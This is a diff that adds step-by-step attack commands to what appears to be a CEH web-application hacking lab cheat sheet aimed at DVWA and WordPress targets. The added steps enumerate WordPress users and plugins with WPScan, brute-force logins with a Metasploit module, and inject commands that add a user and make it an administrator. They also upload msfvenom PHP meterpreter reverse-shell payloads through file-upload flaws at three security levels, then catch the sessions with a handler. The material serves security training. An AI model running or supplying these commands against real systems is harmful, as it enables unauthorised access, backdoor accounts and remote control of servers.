@@ -43,11 +43,91 @@ gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt (displayin
 <<Exploit parameter tampering and XSS vulnerabilities in web applications>>
 
 <<Perform cross-site request forgery (CSRF) attack>>
+wpscan --api-token [API Token from Step#25] --url http://target-ip:port/CEH --plugins-detection aggressive --enumerate vp
+Once you have found vulnerable plugins then send script to victim,
+Once the victim click on that shared script its perform CSRF.
 
 <<Enumerate and hack a web application using WPScan and Metasploit>>
+WPScan tool to enumerate usernames on a WordPress website.
+wpscan --api-token [API Token] --url http://10.10.10.16:8080/CEH --enumerate u
+
+How to crack passwords by performing a dictionary attack using an msf auxiliary module.
+service postgresql start
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/CEHv11 Module 14 Hacking Web Applications/Wordlist/password.txt 
+set RHOSTS [IP Address of Windows Server 2016] 
+set RPORT 8080 and press Enter to set the target port.
+set TARGETURI http://[IP Address of Windows Server 2016]:8080/CEH  
+set USERNAME admin 
+run
 
 <<Exploit a remote command execution vulnerability to compromise a target web server>>
+| hostname
+| whoami
+| tasklist
+| Taskkill /PID [Process ID value of the desired process] /F ( By issuing this command, you are forcefully (/F) terminating the process.)
+| dir C:\ (to view the files and directories on the C:\ drive.)
+| net user (to view user account information)
+| net user Test /Add  (to add a user account remotely.)
+| net user Test ( view the new account’s information)
+| net localgroup Administrators Test /Add (To grant administrative privileges)
+Click the Type here to search field from the bottom of Desktop and type Remote. Click Remote Desktop Connection from the results.
+click Show Options.
 
 <<Exploit a file upload vulnerability at different security levels>>
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
+click Copy from the context menu to copy the payload,
+cd /home/attacker/Desktop/ 
+pluma upload.php paste the code and save file
+upload file to the target website You will see a message saying that the file has been uploaded successfully, with the location of the file. Note the location of the file and minimize the browser window.
+luanch terminal
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp and press Enter
+set LHOST 10.10.10.1 and press Enter
+set LPORT 4444 
+run
+observe that a Meterpreter session established or not
+sysinfo
+
+
+second method (using burp suite with proxy settings)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw
+cd /home/attacker/Desktop/
+pluma medium.php.jpg
+copy, paste and save generated code by msvenom
+visit target website and upload that file and intercept request
+Change the filename to medium.php and click the Forward button to forward the request.
+off  intercpet
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp and press Enter
+set LHOST 10.10.10.1 and press Enter
+set LPORT 4444 
+run
+observe that a Meterpreter session established or not
+sysinfo
+
+Third method 
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=2222 -f raw
+cd /home/attacker/Desktop/
+pluma high.jpeg
+copy, paste and save generated code by msvenom
+visit target website and upload that file
+You will see a message saying that the file has been uploaded successfully, along with the location of the uploaded file. Note down this location.
+Click the Command Injection option in the left pane. The Vulnerability: Command Injection window appears; in the Enter an IP address field, 
+type |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php and click the Submit button.
+msfconsole 
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 2222 and press Enter.
+Type run
+open new tab in browser and visit http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php
+sysinfo
 
 <<Gain backdoor access via a web shell using Weevely>>
+
+---------------------------------------------------------------------------------------------------------
